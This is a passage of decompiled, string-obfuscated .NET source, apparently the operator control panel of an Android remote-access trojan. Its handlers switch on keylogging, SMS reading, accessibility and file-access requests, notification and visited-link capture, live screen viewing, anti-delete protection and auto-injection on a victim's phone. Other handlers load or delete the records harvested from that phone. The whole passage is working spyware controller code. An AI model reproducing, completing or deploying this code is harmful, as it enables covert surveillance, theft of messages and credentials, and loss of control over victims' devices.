			VB_0024AnonymousType_28<string, string> data = new VB_0024AnonymousType_28<string, string>(EXGuarder._54037366, EXGuarder._663C0604);
			requestprime(data);
		}
	}

	private void checkbtry_Click(object sender, EventArgs e)
	{
		if (!holdrequests && checkbtry.Enabled && !checkbtry.Active)
		{
			VB_0024AnonymousType_28<string, string> data = new VB_0024AnonymousType_28<string, string>(EXGuarder._3A5C3070, EXGuarder._4B75054F);
			requestprime(data);
		}
	}

	private void checkdraw_Click(object sender, EventArgs e)
	{
		if (!holdrequests && checkdraw.Enabled && !checkdraw.Active)
		{
			VB_0024AnonymousType_28<string, string> data = new VB_0024AnonymousType_28<string, string>(EXGuarder._59414B35, EXGuarder._784A5E4A);
			requestprime(data);
		}
	}

	private void checkinstll_Click(object sender, EventArgs e)
	{
		if (!holdrequests && checkinstll.Enabled && !checkinstll.Active)
		{
			VB_0024AnonymousType_28<string, string> data = new VB_0024AnonymousType_28<string, string>(EXGuarder._69582470, EXGuarder._4540532F);
			requestprime(data);
		}
	}

	private void checkreadsms_Click(object sender, EventArgs e)
	{
		if (!holdrequests && checkreadsms.Enabled && !checkreadsms.Active)
		{
			VB_0024AnonymousType_28<string, string> data = new VB_0024AnonymousType_28<string, string>(EXGuarder._29134448, EXGuarder._75785432);
			requestprime(data);
		}
	}

	private void checkkeys_ValueChanged(object sender, bool value)
	{
		if (!holdrequests)
		{
			if (value)
			{
				Btcli.UpdateOption(EXGuarder._06293F4D, EXGuarder._4E202339);
			}
			else
			{
				Btcli.UpdateOption(EXGuarder._06293F4D, EXGuarder._0E43275A);
			}
			Btcli.sendoptions();
		}
	}

	private void checkRnotfy_ValueChanged(object sender, bool value)
	{
		if (!holdrequests)
		{
			if (value)
			{
				Btcli.UpdateOption(EXGuarder._6E5B2431, EXGuarder._36124643);
			}
			else
			{
				Btcli.UpdateOption(EXGuarder._6E5B2431, EXGuarder._6A122E03);
			}
			Btcli.sendoptions();
		}
	}

	private void checkRactv_ValueChanged(object sender, bool value)
	{
		if (!holdrequests)
		{
			if (value)
			{
				Btcli.UpdateOption(EXGuarder._3D206A15, EXGuarder._3D013A34);
			}
			else
			{
				Btcli.UpdateOption(EXGuarder._3D206A15, EXGuarder._27164B24);
			}
			Btcli.sendoptions();
		}
	}

	private void chkRvapps_ValueChanged(object sender, bool value)
	{
		if (!holdrequests)
		{
			if (value)
			{
				Btcli.UpdateOption(EXGuarder._150B5C11, EXGuarder._3160314F);
			}
			else
			{
				Btcli.UpdateOption(EXGuarder._150B5C11, EXGuarder._21442B24);
			}
			Btcli.sendoptions();
		}
	}

	private void checkRvlinks_ValueChanged(object sender, bool value)
	{
		if (!holdrequests)
		{
			if (value)
			{
				Btcli.UpdateOption(EXGuarder._652F0079, EXGuarder._613F374A);
			}
			else
			{
				Btcli.UpdateOption(EXGuarder._652F0079, EXGuarder._78741B13);
			}
			Btcli.sendoptions();
		}
	}

	private void chkLivnotify_ValueChanged(object sender, bool value)
	{
		if (!holdrequests)
		{
			if (value)
			{
				Btcli.UpdateOption(EXGuarder._3815021D, EXGuarder._2D586E79);
			}
			else
			{
				Btcli.UpdateOption(EXGuarder._3815021D, EXGuarder._5E56282B);
			}
			Btcli.sendoptions();
		}
	}

	private void comboTargts_SelectedIndexChanged(object sender, EventArgs e)
	{
		string left = comboTargts.Text;
		if (Operators.CompareString(left, EXGuarder._0A12111E, TextCompare: false) != 0)
		{
			if (Operators.CompareString(left, EXGuarder._212E3F42, TextCompare: false) != 0)
			{
				if (Operators.CompareString(left, EXGuarder._2C101846, TextCompare: false) != 0)
				{
					if (Operators.CompareString(left, EXGuarder._5E310B4C, TextCompare: false) != 0)
					{
						if (Operators.CompareString(left, EXGuarder._603F175E, TextCompare: false) == 0)
						{
							string[] array = Btcli.visitedlinks.Split(new string[1] { EXGuarder._51565934 }, StringSplitOptions.None);
							if (Operators.CompareString(Btcli.visitedlinks, EXGuarder._1E755236, TextCompare: false) == 0 || array.Length < 1)
							{
								Combodats.Text = EXGuarder._286A6E44;
								Combodats.Enabled = false;
								BTAlerter.infos(BTConst.novlinkstr);
								return;
							}
							Combodats.Items.Clear();
							string[] array2 = array;
							foreach (string item in array2)
							{
								Combodats.Items.Add(item);
							}
							Combodats.Text = array[0];
							Combodats.Enabled = true;
						}
						else
						{
							Combodats.Text = EXGuarder._286A6E44;
							Combodats.Enabled = false;
						}
						return;
					}
					string[] array3 = Btcli.visitedapps.Split(new string[1] { EXGuarder._51565934 }, StringSplitOptions.None);
					if (Operators.CompareString(Btcli.visitedapps, EXGuarder._1E755236, TextCompare: false) == 0 || array3.Length < 1)
					{
						Combodats.Text = EXGuarder._286A6E44;
						Combodats.Enabled = false;
						BTAlerter.infos(BTConst.novstdapsstr);
						return;
					}
					Combodats.Items.Clear();
					string[] array4 = array3;
					foreach (string item2 in array4)
					{
						Combodats.Items.Add(item2);
					}
					Combodats.Text = array3[0];
					Combodats.Enabled = true;
					return;
				}
				string[] array5 = Btcli.notifications.Split(new string[1] { EXGuarder._51565934 }, StringSplitOptions.None);
				if (Operators.CompareString(Btcli.notifications, EXGuarder._1E755236, TextCompare: false) == 0 || array5.Length < 1)
				{
					Combodats.Text = EXGuarder._286A6E44;
					Combodats.Enabled = false;
					BTAlerter.infos(BTConst.nontifystr);
					return;
				}
				Combodats.Items.Clear();
				string[] array6 = array5;
				foreach (string item3 in array6)
				{
					Combodats.Items.Add(item3);
				}
				Combodats.Text = array5[0];
				Combodats.Enabled = true;
				return;
			}
			string[] array7 = Btcli.activies.Split(new string[1] { EXGuarder._51565934 }, StringSplitOptions.None);
			if (Operators.CompareString(Btcli.activies, EXGuarder._1E755236, TextCompare: false) == 0 || array7.Length < 1)
			{
				Combodats.Text = EXGuarder._286A6E44;
				Combodats.Enabled = false;
				BTAlerter.infos(BTConst.noactivstr);
				return;
			}
			Combodats.Items.Clear();
			string[] array8 = array7;
			foreach (string item4 in array8)
			{
				Combodats.Items.Add(item4);
			}
			Combodats.Text = array7[0];
			Combodats.Enabled = true;
			return;
		}
		string[] array9 = Btcli.keyloggs.Split(new string[1] { EXGuarder._51565934 }, StringSplitOptions.None);
		if (Operators.CompareString(Btcli.keyloggs, EXGuarder._1E755236, TextCompare: false) == 0 || array9.Length < 1)
		{
			Combodats.Text = EXGuarder._286A6E44;
			Combodats.Enabled = false;
			BTAlerter.infos(BTConst.nokelogstr);
			return;
		}
		Combodats.Items.Clear();
		string[] array10 = array9;
		foreach (string item5 in array10)
		{
			Combodats.Items.Add(item5);
		}
		Combodats.Text = array9[0];
		Combodats.Enabled = true;
	}

	private void srchfilsbtn_Click(object sender, EventArgs e)
	{
		string text = null;
		string left = comboTargts.Text;
		if (Operators.CompareString(left, EXGuarder._64101456, TextCompare: false) != 0)
		{
			if (Operators.CompareString(left, EXGuarder._276D1F2D, TextCompare: false) != 0)
			{
				if (Operators.CompareString(left, EXGuarder._55021560, TextCompare: false) != 0)
				{
					if (Operators.CompareString(left, EXGuarder._0B116D46, TextCompare: false) != 0)
					{
						if (Operators.CompareString(left, EXGuarder._526E7869, TextCompare: false) != 0)
						{
							text = null;
							return;
						}
						text = EXGuarder._4A230B02;
					}
					else
					{
						text = EXGuarder._170A0340;
					}
				}
				else
				{
					text = EXGuarder._45351739;
				}
			}
			else
			{
				text = EXGuarder._425D2462;
			}
		}
		else
		{
			text = EXGuarder._4376792F;
		}
		if (text == null)
		{
			BTAlerter.infos(EXGuarder._46034970);
			return;
		}
		if (!Combodats.Enabled || Operators.CompareString(Combodats.Text, EXGuarder._45655B24, TextCompare: false) == 0)
		{
			BTAlerter.infos(EXGuarder._42004968);
			return;
		}
		string fname = Combodats.Text;
		VB_0024AnonymousType_29<string, string, string> data = new VB_0024AnonymousType_29<string, string, string>(EXGuarder._481D4F6E, text, fname);
		loadrecord(data);
	}

	private void DrakeUIButtonIcon1_Click(object sender, EventArgs e)
	{
		string text = null;
		string left = comboTargts.Text;
		if (Operators.CompareString(left, EXGuarder._26086319, TextCompare: false) != 0)
		{
			if (Operators.CompareString(left, EXGuarder._604A4A1C, TextCompare: false) != 0)
			{
				if (Operators.CompareString(left, EXGuarder._5D4B6152, TextCompare: false) != 0)
				{
					if (Operators.CompareString(left, EXGuarder._476D0F78, TextCompare: false) != 0)
					{
						if (Operators.CompareString(left, EXGuarder._455D3324, TextCompare: false) != 0)
						{
							text = null;
							return;
						}
						text = EXGuarder._33194469;
					}
					else
					{
						text = EXGuarder._3D0D1C2A;
					}
				}
				else
				{
					text = EXGuarder._01311A21;
				}
			}
			else
			{
				text = EXGuarder._16282270;
			}
		}
		else
		{
			text = EXGuarder._0C595F02;
		}
		if (text == null)
		{
			BTAlerter.infos(EXGuarder._65253D53);
			return;
		}
		if (!Combodats.Enabled || Operators.CompareString(Combodats.Text, EXGuarder._0E096C19, TextCompare: false) == 0)
		{
			BTAlerter.infos(EXGuarder._286D3B28);
			return;
		}
		string text2 = Combodats.Text;
		if (MyMsg.Show(BTConst.confirmstr, string.Format(EXGuarder._75464B29, BTConst.confdelrecodstr, EXGuarder._1870006E, comboTargts.Text, text2), MyMsg.msgtype.Confirm, use_no: true, showskip: false, EXGuarder._78132D01) != DialogResult.None)
		{
			VB_0024AnonymousType_29<string, string, string> data = new VB_0024AnonymousType_29<string, string, string>(EXGuarder._3365332F, text, text2);
			loadrecord(data);
		}
	}

	private void DrakeUIButtonIcon2_Click(object sender, EventArgs e)
	{
		logactivitystext.Text = EXGuarder._0D382622;
	}

	private void checkwritstng_Click(object sender, EventArgs e)
	{
		if (!holdrequests && checkwritstng.Enabled && !checkwritstng.Active)
		{
			VB_0024AnonymousType_28<string, string> data = new VB_0024AnonymousType_28<string, string>(EXGuarder._6A3A031B, EXGuarder._2D041D06);
			requestprime(data);
		}
	}

	private void checkroaming_ValueChanged(object sender, bool value)
	{
	}

	private void soundoffbtn_Click(object sender, EventArgs e)
	{
	}

	private void vibrateonbtn_Click(object sender, EventArgs e)
	{
	}

	private void soundonbtn_Click(object sender, EventArgs e)
	{
	}

	private void TrackBartimeout_MouseUp(object sender, MouseEventArgs e)
	{
	}

	private void TrackBarBrightness_MouseUp(object sender, MouseEventArgs e)
	{
	}

	private void trackring_MouseUp(object sender, MouseEventArgs e)
	{
	}

	private void profile_FormClosing(object sender, FormClosingEventArgs e)
	{
		statetimer.Stop();
	}

	private void checkaccfiles_Click(object sender, EventArgs e)
	{
		if (!holdrequests && checkaccfiles.Enabled && !checkaccfiles.Active)
		{
			VB_0024AnonymousType_28<string, string> data = new VB_0024AnonymousType_28<string, string>(EXGuarder._74371B5C, EXGuarder._78492619);
			requestprime(data);
		}
	}

	private void chkscrns_ValueChanged(object sender, bool value)
	{
		if (holdrequests)
		{
			return;
		}
		if (value)
		{
			Btcli.UpdateOption(EXGuarder._3E00116B, EXGuarder._003F6F4A);
			mainform.Invoke((VB_0024AnonymousDelegate_0)([SpecialName] () =>
			{
				mainform.AddtoScreens(Btcli.mobid, Btcli.name + EXGuarder._444A7700 + Btcli.address, Btcli.wallpaper, Resources.scr_load);
			}));
		}
		else
		{
			Btcli.UpdateOption(EXGuarder._3E00116B, EXGuarder._61542917);
			mainform.Invoke((VB_0024AnonymousDelegate_0)([SpecialName] () =>
			{
				mainform.RemoveScreens(Btcli.mobid);
			}));
		}
	}

	private void DrakeUIButtonIcon1_Click_1(object sender, EventArgs e)
	{
		string text = null;
		string left = comboTargts.Text;
		if (Operators.CompareString(left, EXGuarder._4C3C3566, TextCompare: false) != 0)
		{
			if (Operators.CompareString(left, EXGuarder._505C5369, TextCompare: false) != 0)
			{
				if (Operators.CompareString(left, EXGuarder._5D733925, TextCompare: false) != 0)
				{
					if (Operators.CompareString(left, EXGuarder._0C733A48, TextCompare: false) != 0)
					{
						if (Operators.CompareString(left, EXGuarder._74795604, TextCompare: false) != 0)
						{
							text = null;
							return;
						}
						text = EXGuarder._391C5511;
					}
					else
					{
						text = EXGuarder._62031F52;
					}
				}
				else
				{
					text = EXGuarder._38296138;
				}
			}
			else
			{
				text = EXGuarder._224F6834;
			}
		}
		else
		{
			text = EXGuarder._0C705804;
		}
		if (text == null)
		{
			BTAlerter.infos(EXGuarder._6E0F5427);
			return;
		}
		if (!Combodats.Enabled || Operators.CompareString(Combodats.Text, EXGuarder._1844111A, TextCompare: false) == 0)
		{
			BTAlerter.infos(EXGuarder._4133552F);
			return;
		}
		string text2 = Combodats.Text;
		string text3 = Combodats.Items.Count.ToString();
		if (MyMsg.Show(BTConst.confirmstr, string.Format(EXGuarder._04453123, BTConst.confdelrecodstr, EXGuarder._33093073, BTConst.totalstr, text3), MyMsg.msgtype.Confirm, use_no: true, showskip: false, EXGuarder._6451636F) == DialogResult.None)
		{
			return;
		}
		foreach (object item in Combodats.Items)
		{
			string fname = Conversions.ToString(item);
			VB_0024AnonymousType_29<string, string, string> data = new VB_0024AnonymousType_29<string, string, string>(EXGuarder._3F693064, text, fname);
			loadrecord(data);
		}
	}

	private void DrakeUIButtonIcon2_Click_1(object sender, EventArgs e)
	{
		_Closure_0024__487_002D0 arg = default(_Closure_0024__487_002D0);
		_Closure_0024__487_002D0 CS_0024_003C_003E8__locals12 = new _Closure_0024__487_002D0(arg);
		CS_0024_003C_003E8__locals12._0024VB_0024Me = this;
		CS_0024_003C_003E8__locals12._0024VB_0024Local_loadit = null;
		string left = comboTargts.Text;
		if (Operators.CompareString(left, EXGuarder._5C3E620C, TextCompare: false) != 0)
		{
			if (Operators.CompareString(left, EXGuarder._492C5033, TextCompare: false) != 0)
			{
				if (Operators.CompareString(left, EXGuarder._47550567, TextCompare: false) != 0)
				{
					if (Operators.CompareString(left, EXGuarder._662D6A3B, TextCompare: false) != 0)
					{
						if (Operators.CompareString(left, EXGuarder._0669416D, TextCompare: false) != 0)
						{
							CS_0024_003C_003E8__locals12._0024VB_0024Local_loadit = null;
							return;
						}
						CS_0024_003C_003E8__locals12._0024VB_0024Local_loadit = EXGuarder._5932770B;
					}
					else
					{
						CS_0024_003C_003E8__locals12._0024VB_0024Local_loadit = EXGuarder._1D0F2F11;
					}
				}
				else
				{
					CS_0024_003C_003E8__locals12._0024VB_0024Local_loadit = EXGuarder._501E0A53;
				}
			}
			else
			{
				CS_0024_003C_003E8__locals12._0024VB_0024Local_loadit = EXGuarder._0D430553;
			}
		}
		else
		{
			CS_0024_003C_003E8__locals12._0024VB_0024Local_loadit = EXGuarder._7731025E;
		}
		if (CS_0024_003C_003E8__locals12._0024VB_0024Local_loadit == null)
		{
			BTAlerter.infos(EXGuarder._37226E02);
			return;
		}
		if (!Combodats.Enabled || Operators.CompareString(Combodats.Text, EXGuarder._5C56541D, TextCompare: false) == 0)
		{
			BTAlerter.infos(EXGuarder._402B0B71);
			return;
		}
		string text = Combodats.Text;
		string text2 = Combodats.Items.Count.ToString();
		if (MyMsg.Show(BTConst.confirmstr, string.Format(EXGuarder._50516D2E, BTConst.confloadallstr, EXGuarder._07774918, BTConst.totalstr, text2), MyMsg.msgtype.Confirm, use_no: true, showskip: false, EXGuarder._1E765302) == DialogResult.None)
		{
			return;
		}
		try
		{
			Process.Start(Btcli.userfolder);
		}
		catch (Exception ex)
		{
			ProjectData.SetProjectError(ex);
			Exception ex2 = ex;
			ProjectData.ClearProjectError();
		}
		Thread thread = new Thread([SpecialName] () =>
		{
			foreach (object item in CS_0024_003C_003E8__locals12._0024VB_0024Me.Combodats.Items)
			{
				string fname = Conversions.ToString(item);
				VB_0024AnonymousType_29<string, string, string> data = new VB_0024AnonymousType_29<string, string, string>("L", CS_0024_003C_003E8__locals12._0024VB_0024Local_loadit, fname);
				CS_0024_003C_003E8__locals12._0024VB_0024Me.loadrecord(data);
				Thread.Sleep(1);
			}
		});
		thread.IsBackground = true;
		thread.Start();
	}

	private void checknotifys_Click(object sender, EventArgs e)
	{
		if (!holdrequests && checknotifys.Enabled && !checknotifys.Active)
		{
			VB_0024AnonymousType_28<string, string> data = new VB_0024AnonymousType_28<string, string>(EXGuarder._4E664647, EXGuarder._3C244C40);
			requestprime(data);
		}
	}

	private void Checkatoject_ValueChanged(object sender, bool value)
	{
		if (!holdrequests)
		{
			if (value)
			{
				Btcli.UpdateOption(EXGuarder._502D4842, EXGuarder._666B6E48);
			}
			else
			{
				Btcli.UpdateOption(EXGuarder._502D4842, EXGuarder._3116324C);
			}
			Btcli.sendoptions();
		}
	}

	private void checkantdelete_ValueChanged(object sender, bool value)
	{
		if (!holdrequests)
		{
			VB_0024AnonymousType_28<string, string> data = new VB_0024AnonymousType_28<string, string>(EXGuarder._1E6C5421, EXGuarder._665E181C);
			requestprime(data);
		}
	}

	private void checkcallph_Click(object sender, EventArgs e)
	{
		if (!holdrequests && checkcallph.Enabled && !checkcallph.Active)
		{
			VB_0024AnonymousType_28<string, string> data = new VB_0024AnonymousType_28<string, string>(EXGuarder._71673747, EXGuarder._15733A2E);
			requestprime(data);
		}
	}

	private void Checkcryptmsg_ValueChanged(object sender, bool value)
	{
		if (!holdrequests)
		{
			if (value)
			{
				Btcli.UpdateOption(EXGuarder._15333909, EXGuarder._724A5341);
			}
			else
			{
				Btcli.UpdateOption(EXGuarder._15333909, EXGuarder._0B20446B);
			}
			Btcli.sendoptions();
		}
	}
}
